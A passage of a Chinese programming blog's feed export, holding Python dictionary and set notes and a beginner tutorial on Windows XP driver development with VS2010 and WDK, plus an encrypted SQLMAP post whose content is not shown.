<td align="left">dict.has_key(key)<br>如果键在字典dict里返回true，否则返回false</td>
</tr>
<tr>
<td align="center">6</td>
<td align="left">dict.items()<br>以列表返回可遍历的(键, 值) 元组数组</td>
</tr>
<tr>
<td align="center">7</td>
<td align="left">dict.keys()<br>以列表返回一个字典所有的键</td>
</tr>
<tr>
<td align="center">8</td>
<td align="left">dict.setdefault(key, default&#x3D;None)<br>和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default</td>
</tr>
<tr>
<td align="center">9</td>
<td align="left">dict.update(dict2)<br>把字典dict2的键&#x2F;值对更新到dict里</td>
</tr>
<tr>
<td align="center">10</td>
<td align="left">dict.values()<br>以列表返回字典中的所有值</td>
</tr>
<tr>
<td align="center">11</td>
<td align="left">pop(key[,default])<br>删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。</td>
</tr>
<tr>
<td align="center">12</td>
<td align="left">popitem()<br>随机返回并删除字典中的一对键和值。</td>
</tr>
</tbody></table>
<br>

<br>

<h3 id="七-集合"><a href="#七-集合" class="headerlink" title="七. 集合"></a><font color="#FF6347" face="Comic sans MS">七. 集合</font></h3><blockquote>
<p><font color="#FF7F00"><strong>集合是什么：</strong></font></p>
</blockquote>
<ol>
<li>集合和字典类似，也是一组key的集合，但不存储value。由于key不能重复，所以，在集合中，没有重复的key；</li>
<li>集合可以看成数学意义上的无序和无重复元素的集合，因此，两个set可以做数学意义上的交集、并集，差等操作；</li>
<li>基本功能包括关系测试和消除重复元素。集合对象还支持 union（联合），intersection（交），difference（差）和 sysmmetric difference（对称差集）等数学运算；</li>
<li>大括号或 set() <strong>函数</strong>可以用来创建集合。注意：想要创建空集合，你必须使用 set() 而不是 {}。后者用于创建空字典。</li>
<li>注意：<font color="#FF7F00"><strong>set()只能放一个参数，它会将里面的字符串拆成字符，并且每个字符都是无序的（集合的属性）</strong></font>；</li>
<li>如果集合中包含多喝不可拆的元素，则必须用{}来定义集合。</li>
</ol>
<br>

<p>仔细分析如下代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">basket = &#123;</span><br><span class="line">	<span class="string">&#x27;apple&#x27;</span>, </span><br><span class="line">	<span class="string">&#x27;orange&#x27;</span>, </span><br><span class="line">	<span class="string">&#x27;apple&#x27;</span>, </span><br><span class="line">	<span class="string">&#x27;pear&#x27;</span>, </span><br><span class="line">	<span class="string">&#x27;orange&#x27;</span>, </span><br><span class="line">	<span class="string">&#x27;banana&#x27;</span>&#125;</span><br><span class="line">	</span><br><span class="line"><span class="built_in">print</span>(basket)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line"></span><br><span class="line">a = <span class="built_in">set</span>(<span class="string">&#x27;abracadabra&#x27;</span>)</span><br><span class="line">b = <span class="built_in">set</span>(<span class="string">&#x27;alacazam&#x27;</span>)</span><br><span class="line">c =<span class="built_in">set</span>(<span class="string">&#x27;我们&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a) </span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a - b) </span><br><span class="line"><span class="built_in">print</span>(a | b) </span><br><span class="line"><span class="built_in">print</span>(a &amp; b) </span><br><span class="line"><span class="built_in">print</span>(a ^ b ) </span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">&#123;<span class="string">&#x27;pear&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;d&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;l&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;们&#x27;</span>, <span class="string">&#x27;我&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;b&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;l&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;c&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;r&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python语言</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLMAP命令大全</title>
    <url>/post/SQLMAP-shell/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="a8b138038777359dfc2a400b77a87c693dfe78aa70144146d7c822c9b545eca3"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Kali-SQLMAP</category>
      </categories>
      <tags>
        <tag>SQLMAP命令</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows XP 驱动开发（一）</title>
    <url>/post/WinXP-Driver/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ  ɔ: </p>
<span id="more"></span>

<h2 id="1-环境安装"><a href="#1-环境安装" class="headerlink" title="1 环境安装"></a>1 环境安装</h2><h3 id="1-1-安装VS-2010"><a href="#1-1-安装VS-2010" class="headerlink" title="1.1 安装VS 2010"></a>1.1 安装VS 2010</h3><p><a href="https://my.visualstudio.com/Downloads?q=Visual%20Studio%202010&pgroup=">点击下载安装镜像</a></p>
<h3 id="1-2-安装WDK-7600"><a href="#1-2-安装WDK-7600" class="headerlink" title="1.2 安装WDK 7600"></a>1.2 安装WDK 7600</h3><p><a href="https://www.microsoft.com/en-us/download/details.aspx?id=11800">点击下载安装镜像</a></p>
<h3 id="1-3-VS-2010开发驱动环境配置"><a href="#1-3-VS-2010开发驱动环境配置" class="headerlink" title="1.3 VS 2010开发驱动环境配置"></a>1.3 VS 2010开发驱动环境配置</h3><p>VS 2010 本身不支持创建驱动项目，所以我们的做法一般是创建一个空项目，然后修改项目配置。这种做法容易出错，我们可以事先准备好一个配置文件，以后创建项目直接导入即可。</p>
<p>步骤：</p>
<ol>
<li><p>文件-新建-项目- Visual C++-空项目-名称（HelloDriver）。</p>
</li>
<li><p>生成-配置管理器-活动解决方案配置-新建-名称（Driver_1）、从此处复制设置：Debug。</p>
</li>
<li><p>视图-属性管理器-点开左框“HelloDriver”列表小三角▶️符号-选中步骤2新建的Driver_1右键-添加新项目属性表-名称（DriverProperty）。</p>
</li>
<li><p>到项目目录（C:\Users\alvin\Documents\Visual Studio 2010\Projects\HelloDriver）中找到“DriverProperty.props”文件-使用以下内容进行替换。</p>
</li>
<li><p>之后再新建驱动项目时仅需执行前2步，第3步选择添加现有属性表即可。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Project</span> <span class="attr">ToolsVersion</span>=<span class="string">&quot;4.0&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ImportGroup</span> <span class="attr">Label</span>=<span class="string">&quot;PropertySheets&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">PropertyGroup</span> <span class="attr">Label</span>=<span class="string">&quot;UserMacros&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">PropertyGroup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ExecutablePath</span>&gt;</span>D:\WinDDK\7600.16385.1\bin\x86;$(ExecutablePath)<span class="tag">&lt;/<span class="name">ExecutablePath</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">PropertyGroup</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">PropertyGroup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">IncludePath</span>&gt;</span>D:\WinDDK\7600.16385.1\inc\api;D:\WinDDK\7600.16385.1\inc\ddk;D:\WinDDK\7600.16385.1\inc\crt;$(IncludePath)<span class="tag">&lt;/<span class="name">IncludePath</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">PropertyGroup</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">PropertyGroup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">LibraryPath</span>&gt;</span>D:\WinDDK\7600.16385.1\lib\wxp\i386;$(LibraryPath)<span class="tag">&lt;/<span class="name">LibraryPath</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TargetExt</span>&gt;</span>.sys<span class="tag">&lt;/<span class="name">TargetExt</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">LinkIncremental</span>&gt;</span>false<span class="tag">&lt;/<span class="name">LinkIncremental</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">GenerateManifest</span>&gt;</span>false<span class="tag">&lt;/<span class="name">GenerateManifest</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">PropertyGroup</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ItemDefinitionGroup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ClCompile</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">PreprocessorDefinitions</span>&gt;</span>_X86_;DBG<span class="tag">&lt;/<span class="name">PreprocessorDefinitions</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">CallingConvention</span>&gt;</span>StdCall<span class="tag">&lt;/<span class="name">CallingConvention</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ExceptionHandling</span>&gt;</span>false<span class="tag">&lt;/<span class="name">ExceptionHandling</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">BasicRuntimeChecks</span>&gt;</span>Default<span class="tag">&lt;/<span class="name">BasicRuntimeChecks</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">BufferSecurityCheck</span>&gt;</span>false<span class="tag">&lt;/<span class="name">BufferSecurityCheck</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">CompileAs</span>&gt;</span>Default<span class="tag">&lt;/<span class="name">CompileAs</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">DebugInformationFormat</span>&gt;</span>ProgramDatabase<span class="tag">&lt;/<span class="name">DebugInformationFormat</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">AssemblerOutput</span>&gt;</span>All<span class="tag">&lt;/<span class="name">AssemblerOutput</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ClCompile</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Link</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">AdditionalDependencies</span>&gt;</span>ntoskrnl.lib;wdm.lib;wdmsec.lib;wmilib.lib;ndis.lib;Hal.lib;MSVCRT.LIB;LIBCMT.LIB;%(AdditionalDependencies)<span class="tag">&lt;/<span class="name">AdditionalDependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Link</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Link</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">IgnoreAllDefaultLibraries</span>&gt;</span>true<span class="tag">&lt;/<span class="name">IgnoreAllDefaultLibraries</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">EnableUAC</span>&gt;</span>false<span class="tag">&lt;/<span class="name">EnableUAC</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">SubSystem</span>&gt;</span>Native<span class="tag">&lt;/<span class="name">SubSystem</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">EntryPointSymbol</span>&gt;</span>DriverEntry<span class="tag">&lt;/<span class="name">EntryPointSymbol</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">BaseAddress</span>&gt;</span>0x10000<span class="tag">&lt;/<span class="name">BaseAddress</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">RandomizedBaseAddress</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">RandomizedBaseAddress</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">DataExecutionPrevention</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">DataExecutionPrevention</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">GenerateDebugInformation</span>&gt;</span>true<span class="tag">&lt;/<span class="name">GenerateDebugInformation</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Driver</span>&gt;</span>Driver<span class="tag">&lt;/<span class="name">Driver</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Link</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ItemDefinitionGroup</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ItemGroup</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Project</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>替换内容：</p>
<ul>
<li><code>&lt;LibraryPath&gt;D:\WinDDK\7600.16385.1\lib\wxp\i386;$(LibraryPath)&lt;/LibraryPath&gt;</code>是设置目标平台的：将<code>D:\WinDDK</code>替换为本机WDK安装路径，替换为<code>C:\WinDDK</code>。</li>
<li><code>wxp</code>表示Windows XP系统。因为我们的学习平台就是XP，这里就不用改了。</li>
</ul>
</li>
<li><p>重启VS 2010。</p>
</li>
<li><p>左下角解决方案管理器-源代码-右键添加-新建项-Visual C++-C++文件-名称（.c文件）。</p>
</li>
<li><p>在新建的.c文件文件中添加如下驱动函数入口代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;ntddk.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>F7调试生成，生成文件在<code>C:\Users\alvin\Documents\Visual Studio 2010\Projects\HelloDriver\Driver_1\HelloDriver.sys</code>。</p>
</li>
</ol>
<p>可以把鼠标放到类型上面去看属性，也可以使用F12进去查看。</p>
<h2 id="2-编译调试驱动程序"><a href="#2-编译调试驱动程序" class="headerlink" title="2 编译调试驱动程序"></a>2 编译调试驱动程序</h2><h3 id="2-1-驱动开发流程"><a href="#2-1-驱动开发流程" class="headerlink" title="2.1 驱动开发流程"></a>2.1 驱动开发流程</h3><p>驱动的开发流程：<br>编写代码 ----&gt;  生成.sys文件 ----&gt; 部署 ----&gt; 启动 ----&gt; 停止 ----&gt; 卸载。</p>
<h3 id="2-2-PDB文件"><a href="#2-2-PDB文件" class="headerlink" title="2.2 .PDB文件"></a>2.2 .PDB文件</h3><ol>
<li>PDB文件是在我们编译工程的时候产生的，它是和对应的模块（exe、dll或sys）一起生成出来的。</li>
<li>每个模块编译的时候都可以生成自己的PDB文件。比如.exe&#x2F;.dll&#x2F;.sys等等。</li>
</ol>
<p>PDB文件是编译驱动的同时生成的调试信息文件，它可以帮助我们像调试应用程序一样调试驱动程序。其实之前我们已经使用过PDB，我们配置双机调试环境时，在物理机上安装了符号文件，并在Windbg中导入过。</p>
<p>有了PDB，我们就可以知道当前汇编语句属于哪个函数，程序定义的结构体等关键信息，说一句题外话，软件发布的时候，切记不要把PDB也发布出去，因为这会给别人破解你的软件提供巨大便利。</p>
<h3 id="2-3-配置PDB路径"><a href="#2-3-配置PDB路径" class="headerlink" title="2.3 配置PDB路径"></a>2.3 配置PDB路径</h3><p>我们要调试一个驱动程序，就要将这个驱动程序的PDB文件的路径配置到Windbg的符号文件路径“Symbol FIle Path…”中，然后执行<code>.reload</code>。</p>
<p>步骤：</p>
<ol>
<li><p>在Win7下编译生成XP的驱动文件<code>sys</code>。</p>
</li>
<li><p>找到该sys一起发布的<code>.pdb</code>文件。</p>
</li>
<li><p>将所在目录路径复制到Windbg的符号文件路径下（记得加分号<code>;</code>），然后执行<code>.reload</code>。（C:\Users\alvin\Documents\Visual Studio 2010\Projects\20220112_01_FirstDriver\First_20220112）</p>
<p><img data-src="https://s2.loli.net/2022/01/13/ue7EyH2T1itpShm.png" alt="1.png"></p>
<p><img data-src="https://s2.loli.net/2022/01/13/PCkgcLDrZoFJQ9a.png" alt="2.png"></p>
</li>
</ol>
<h2 id="3-调试程序"><a href="#3-调试程序" class="headerlink" title="3 调试程序"></a>3 调试程序</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载函数</span></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT driver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;驱动程序停止运行了.\r\n&quot;</span>);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数，相当于main</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 下断点</span></span><br><span class="line">	__asm </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> <span class="number">3</span></span><br><span class="line">		mov eax,eax</span><br><span class="line">		mov ecx,ecx</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 驱动程序入口</span></span><br><span class="line">	DbgPrint(<span class="string">&quot;A1v1n的第一个驱动程序.\r\n&quot;</span>);	</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 设置一个卸载函数，便于退出</span></span><br><span class="line">	driver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，触发断点了，观察windbg窗口：多了一个源代码窗口，现在可以像调试应用程序一样调试驱动了。</p>
<p><img data-src="https://s2.loli.net/2022/01/13/WbsRMgpAvhazuEO.png" alt="3.png"></p>
<h2 id="4-内核编程基础"><a href="#4-内核编程基础" class="headerlink" title="4 内核编程基础"></a>4 内核编程基础</h2><h3 id="4-1-内核API的使用"><a href="#4-1-内核API的使用" class="headerlink" title="4.1 内核API的使用"></a>4.1 内核API的使用</h3><p>在应用层编程我们可以使用WINDOWS提供的各种API函数，只要导入头文件<code>&lt;windows.h&gt;</code>就可以了，但是在内核编程的时候，我们不能像在Ring3那样直接使用。微软为内核程序提供了专用的API，只要在程序中包含相应的头文件就可以使用了，如：<code>#include &lt;ntddk.h&gt; </code>(假设你已经正确安装了WDK)。<br>2、 在应用层编程的时候，我们通过MSDN来了解函数的详细信息，在内核编程的时候，要使用WDK自己的帮助文档。</p>
<div class="note danger"><p>WDK查到的函数就一定在导出表里：</p>
<p><mark class="label success">文档化函数</mark>：函数在导出表里，有文档说明，有头文件。</p>
<p><mark class="label warning">未文档化函数</mark>：导出表里有，没有文档说明，没有头文件，定义<strong>函数指针</strong>去使用（<code>*pFN = GetProcessAddress(&quot;xyz&quot;)</code>）。</p>
<p><mark class="label primary">未导出函数</mark>：不在导出表，无文档说明，没有头文件，可以找到该函数的地址，然后使用<strong>函数指针</strong>去使用（<code>*pFN = 0x89765786</code>）。</p>
</div>

<h3 id="4-2-未导出函数的使用"><a href="#4-2-未导出函数的使用" class="headerlink" title="4.2 未导出函数的使用"></a>4.2 未导出函数的使用</h3><p>WDK说明文档中只包含了内核模块导出的函数，对于未导出的函数，则不能直接使用。</p>
<p>如果要使用未导出的函数，只要定义一个<strong>函数指针</strong>，并且为函数指针提供正确的函数地址就可以使用了。有两种办法都可以获取为导出的函数地址：</p>
<ol>
<li>特征码搜索。</li>
<li>解析内核PDB文件（使用<code>uf 函数名称</code>或<code>u 地址</code>）。</li>
</ol>
<h3 id="4-3-内核函数前缀"><a href="#4-3-内核函数前缀" class="headerlink" title="4.3 内核函数前缀"></a>4.3 内核函数前缀</h3><p>表2.3列出了一些常用的标识性前缀。（《Windows内核原理与实现》2.3.1）</p>
<p><img data-src="https://i.loli.net/2021/05/26/f6z1tYC8iWxBM4v.png" alt="12.png"></p>
<h3 id="4-4-内核基本数据类型"><a href="#4-4-内核基本数据类型" class="headerlink" title="4.4 内核基本数据类型"></a>4.4 内核基本数据类型</h3><p>WDK数据类型在<code>ntdef.h</code>中定义，下面列举部分，注意，<strong>并没有UINT</strong>。</p>
<p>在内核编程的时候，强烈建议大家遵守WDK的编码习惯，不要这样写：<code>unsigned long length;   </code>。</p>
<p>习惯使用WDK自己的类型（列举部分）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> VOID void</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> CHAR;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">short</span> SHORT;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> LONG;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> UCHAR;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">short</span> USHORT;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> ULONG;</span><br><span class="line"><span class="keyword">typedef</span> QUAD UQUAD;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">void</span> *PVOID;</span><br><span class="line"><span class="keyword">typedef</span> UCHAR *PUCHAR;</span><br><span class="line"><span class="keyword">typedef</span> USHORT *PUSHORT;</span><br><span class="line"><span class="keyword">typedef</span> ULONG *PULONG;</span><br><span class="line"><span class="keyword">typedef</span> UQUAD *PUQUAD;</span><br></pre></td></tr></table></figure>



<h3 id="4-5-NTSTATUS返回值"><a href="#4-5-NTSTATUS返回值" class="headerlink" title="4.5 NTSTATUS返回值"></a>4.5 NTSTATUS返回值</h3><p>4字节大小，类型定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> LONG NTSTATUS</span><br></pre></td></tr></table></figure>

<p>当你调用的内核函数，如果返回的结果不是STATUS_SUCCESS，就说明函数执行中遇到了问题，具体是什么问题，可以在<code>ntstatus.h</code>文件中查看。</p>
<p>大部分内核函数的返回值都是NTSTATUS类型，如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">PsCreateSystemThread</span><span class="params">()</span></span>;    </span><br><span class="line"><span class="function">NTSTATUS <span class="title">ZwOpenProcess</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">ZwOpenEvent</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>

<p>这个值能说明函数执行的结果，比如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">STATUS_SUCCESS			<span class="number">0x00000000</span>	成功		</span><br><span class="line">STATUS_INVALID_PARAMETER	<span class="number">0xC000000D</span>	参数无效	</span><br><span class="line">STATUS_BUFFER_OVERFLOW		<span class="number">0x80000005</span>	缓冲区长度不够</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>NT_SUCCESS(<em>Status</em>)</li>
</ul>
<p> Evaluates to TRUE if the return value specified by <em>Status</em> is a  success type (0 − 0x3FFFFFFF) or an informational type (0x40000000 −  0x7FFFFFFF). </p>
<ul>
<li>NT_INFORMATION(<em>Status</em>)</li>
</ul>
<p> Evaluates to TRUE if the return value specified by <em>Status</em> is an  informational type (0x40000000 − 0x7FFFFFFF). </p>
<ul>
<li>NT_WARNING(<em>Status</em>)</li>
</ul>
<p> Evaluates to TRUE if the return value specified by <em>Status</em> is a  warning type (0x80000000 − 0xBFFFFFFF). </p>
<ul>
<li>NT_ERROR(<em>Status</em>)</li>
</ul>
<p> Evaluates to TRUE if the return value specified by <em>Status</em> is an error  type (0xC0000000 - 0xFFFFFFFF). </p>
</blockquote>
<h3 id="4-6-内核异常处理"><a href="#4-6-内核异常处理" class="headerlink" title="4.6 内核异常处理"></a>4.6 内核异常处理</h3><p>在内核中，一个小小的错误就可能导致蓝屏，比如：读写一个无效的内存地址。为了让自己的内核程序更加健壮，强烈建议大家在编写内核程序时，使用异常处。<br>Windows提供了结构化异常处理机制，一般的编译器都是支持的，如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__try&#123;</span><br><span class="line">	<span class="comment">//可能出错的代码</span></span><br><span class="line">&#125;</span><br><span class="line">__except(filter_value) &#123;</span><br><span class="line">	<span class="comment">//出错时要执行的代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>出现异常时，可根据<code>filter_value</code>的值来决定程序该如果执行，当<code>filter_value</code>的值为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">EXCEPTION_EXECUTE_HANDLER(<span class="number">1</span>)		代码进入except块</span><br><span class="line">EXCEPTION_CONTINUE_SEARCH(<span class="number">0</span>)		不处理异常，由上一层调用函数处理</span><br><span class="line">EXCEPTION_CONTINUE_EXECUTION(<span class="number">-1</span>)	回去继续执行错误处的代码</span><br></pre></td></tr></table></figure>



<h3 id="4-7-常用的内核内存函数"><a href="#4-7-常用的内核内存函数" class="headerlink" title="4.7 常用的内核内存函数"></a>4.7 常用的内核内存函数</h3><table>
<thead>
<tr>
<th align="center">C语言</th>
<th align="center">内核</th>
</tr>
</thead>
<tbody><tr>
<td align="center">malloc</td>
<td align="center">ExAllocatePool</td>
</tr>
<tr>
<td align="center">memset</td>
<td align="center">RtlFillMemory</td>
</tr>
<tr>
<td align="center">memcpy</td>
<td align="center">RtlMoveMemory</td>
</tr>
<tr>
<td align="center">free</td>
<td align="center">ExFreePool</td>
</tr>
</tbody></table>
<h3 id="4-8-内核字符串及常用字符串函数"><a href="#4-8-内核字符串及常用字符串函数" class="headerlink" title="4.8 内核字符串及常用字符串函数"></a>4.8 内核字符串及常用字符串函数</h3><p>为了提高安全性，内核中的字符串不再是字符串首地址指针作为开始，0作为结尾，而是采用了以下两个结构体：</p>
<p><strong>ANSI_STRING字符串：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">STRING</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    USHORT Length;		<span class="comment">//字符串长度（单位：字节）</span></span><br><span class="line">    USHORT MaximumLength;	<span class="comment">//字符串最大长度</span></span><br><span class="line">    PCHAR Buffer;		<span class="comment">//字符串首地址</span></span><br><span class="line">&#125;STRING;</span><br></pre></td></tr></table></figure>

<p><strong>UNICODE_STRING字符串：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    USHORT Length;</span><br><span class="line">    USHORT MaxmumLength;</span><br><span class="line">    PWSTR Buffer;</span><br><span class="line">&#125; UNICODE_STRING;</span><br></pre></td></tr></table></figure>

<p>下面的表格列出了常用的字符串函数：</p>
<table>
<thead>
<tr>
<th>功能</th>
<th>ANSI_STRING字符串</th>
<th>UNICODE_STRING字符串</th>
</tr>
</thead>
<tbody><tr>
<td>创建</td>
<td>RtlInitAnsiString</td>
<td>RtlInitUnicodeString</td>
</tr>
